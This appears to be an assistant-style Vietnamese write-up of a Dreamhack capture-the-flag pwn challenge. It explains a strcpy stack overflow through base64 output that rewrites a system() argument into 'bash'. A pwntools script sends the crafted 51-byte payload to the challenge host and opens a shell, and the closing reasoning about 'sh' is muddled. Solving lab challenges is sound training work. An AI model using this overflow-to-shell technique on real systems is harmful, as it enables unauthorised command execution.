Hay đấy! Bài này đúng kiểu “overflow bằng base64” để sửa string gọi `system()`.

## Phân tích nhanh

* Menu `[1] Base64 Encode` đọc **tối đa 64 byte** vào `local_b8` rồi **base64-hoá** bằng `FUN_00101269`.
* Kết quả base64 (dài `4*ceil(n/3)` ký tự) được `strcpy` vào **buffer stack 64 byte** `local_78`:

  ```c
  local_18 = FUN_00101269(local_b8, local_c);
  strcpy(local_78, local_18);  // tràn stack nếu outlen > 64
  ```
* Ngay sau `local_78` trên stack là `local_38[32]` chứa sẵn chuỗi `"echo bye"`; khi chọn `[2] Exit` thì:

  ```c
  system(local_38);
  ```
* Ý tưởng: làm `strcpy` tràn đúng **4 ký tự** sang `local_38`, biến nó thành **"bash"**, rồi chọn `[2]` để chạy `system("bash")` → shell.

## Tính toán độ dài & 4 ký tự tràn

* Muốn ghi đúng 4 ký tự vào `local_38`, tổng độ dài base64 cần là `64 + 4 = 68`.
* Base64 output = `4 * ceil(n/3)` ⇒ cần `ceil(n/3) = 17` ⇒ **n ∈ {49, 50, 51}**.
* Tránh padding `=` vì ta cần 4 ký tự thường → chọn **n = 51** (chia hết cho 3).

Bây giờ ta ép **4 sextet cuối** của base64 thành ký tự `"bash"`.

* Bảng base64: `A–Z = 0..25, a–z = 26..51, 0–9 = 52..61, + = 62, / = 63`.
* “bash” ⇒ chỉ số: `b=27, a=26, s=44, h=33`.
* Với 3 byte cuối (a,b,c) của input:

  ```
  o1 = a >> 2                         = 27
  o2 = ((a & 3) << 4) | (b >> 4)      = 26
  o3 = ((b & 0xF) << 2) | (c >> 6)    = 44
  o4 =  c & 0x3F                      = 33
  ```

  Một nghiệm đơn giản:

  * Chọn `c = 0x21` (33)  → `o4 = 33`, `c >> 6 = 0`
  * Cần `(b & 0xF) << 2 = 44`  → `b & 0xF = 0xB`  ⇒ **b = 0xAB**
  * Cần `((a & 3) << 4) + (b >> 4) = 26` với `b >> 4 = 10` ⇒ `(a & 3) = 1`
  * Đồng thời `a >> 2 = 27` ⇒ `a ∈ {108..111}` và `(a & 3)=1` ⇒ **a = 109 (0x6D)**
* Vậy 3 byte cuối nên là: **`\x6D\xAB\x21`**.

## Khai thác (pwntools)

Gửi tổng cộng **51 byte**: `b"A"*48 + b"\x6D\xAB\x21"`. Base64 dài 68 ký tự; 64 ký tự đầu lấp đầy `local_78`, **4 ký tự “bash”** tràn vào đầu `local_38`, rồi `strcpy` ghi NUL kế tiếp → `local_38` = `"bash\0..."`. Sau đó chọn `[2]` để gọi `system("bash")`.

```python
# exploit.py
from pwn import *

# p = process("./base64_encoder")   # local
p = remote("host8.dreamhack.games", 15994)

def menu_choice(x):
    p.recvuntil(b"> ")
    p.sendline(str(x).encode())

# B1: chọn encode
menu_choice(1)

# B2: gửi 51 byte: 48 'A' + 0x6D 0xAB 0x21
payload = b"A"*48 + b"\x6D\xAB\x21"
p.send(payload)              # read(0, .., 0x40) không cần newline; nếu server đợi, dùng p.sendafter

# In ra kết quả encode
try:
    print(p.recvline(timeout=0.5))
except:
    pass

# B3: chọn Exit để gọi system(local_38) == "bash"
menu_choice(2)

# B4: có shell
p.interactive()
```

### Ghi chú thực chiến

* Nếu server yêu cầu newline cho `read`, thêm `\n` sau payload (nó vẫn đếm đúng 51 byte vì `read` thường trả ngay với số byte sẵn có; nếu không, gộp `payload + b"\n"`).
* Nếu PATH trên server không có `bash`, bạn có thể đổi mục tiêu sang `"sh"` nhưng **không thể** vì 68 ≡ 0 (mod 4) → tràn 4 ký tự. “sh” cần đúng 2 ký tự (68 không phù hợp). “bash” là lựa chọn khớp toán học nhất.
* Không cần libc/PIE/ROP; chỉ là **stack overflow có kiểm soát nội dung**.
